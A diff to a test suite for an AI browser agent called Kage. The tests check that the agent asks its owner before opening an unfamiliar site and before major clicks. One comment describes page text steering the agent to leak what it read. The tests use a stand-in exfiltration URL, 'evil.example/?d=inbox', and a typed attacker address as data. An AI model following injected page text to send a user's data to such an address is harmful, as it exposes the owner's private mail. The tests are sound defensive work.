@@ -718,6 +718,7 @@ describe("acting in the owner's browser", () => {
       if (op === 'snapshot') return { title: 'Compose', url, elements: [{ ref: 2, role: 'button', name: 'Send' }] }
       if (op === 'describe') return { url, el: args.ref === 2 ? { ref: 2, role: o.role?.() ?? 'button', name: o.label?.() ?? 'Send' } : undefined, focused: { ref: 4, role: 'textbox', name: o.focused ?? 'Search' } }
       if (op === 'screenshot' || op === 'crop') return { url, png: PNG }
+      if (op === 'tabs') return [{ id: 3, windowId: 1, active: true, title: 'Compose', url }]
       o.acted?.push(args)
       return { url }
     },
@@ -766,8 +767,26 @@ describe("acting in the owner's browser", () => {
     }
     const cards: string[] = []
     const s = setupAct({}, asking(true, cards))
-    assert.equal((await s.call('browser_act', { ...at, action: 'open', url: 'https://docs.example.com/' })).isError, undefined)
+    assert.equal((await s.call('browser_act', { ...at, action: 'open', url: 'https://mail.example.com/inbox' })).isError, undefined)
     assert.deepEqual(cards, [])
+    // A site no tab is on asks first: page text could steer Kage to an address that carries what it read.
+    await s.call('browser_act', { ...at, action: 'open', url: 'https://evil.example/?d=inbox' })
+    assert.equal(cards.length, 1)
+  })
+  test('with no way to ask the owner, an everyday step still runs and a major one is refused', async () => {
+    const asked: string[] = []
+    assert.equal((await setupAct({ asked, label: () => 'Save' }).call('browser_act', { ...at, action: 'click', ref: 2 })).isError, undefined)
+    const r = await setupAct({ asked }).call('browser_act', { ...at, action: 'click', ref: 2 })
+    assert.equal(r.isError, true)
+    assert.match(r.text, /needs the owner's yes/)
+  })
+  test("after Kage types in a tab, the card for its next button shows what it typed", async () => {
+    const cards: string[] = []
+    const s = setupAct({ label: () => 'Save' }, asking(true, cards))
+    await s.call('browser_act', { ...at, action: 'type', ref: 2, text: 'x@evil.example' })
+    await s.call('browser_act', { ...at, action: 'click', ref: 2 })
+    assert.equal(cards.length, 1)
+    assert.match(cards[0]!, /x@evil\.example/)
   })
   test('a control whose label changed while the card waited is not clicked', async () => {
     const asked: string[] = []
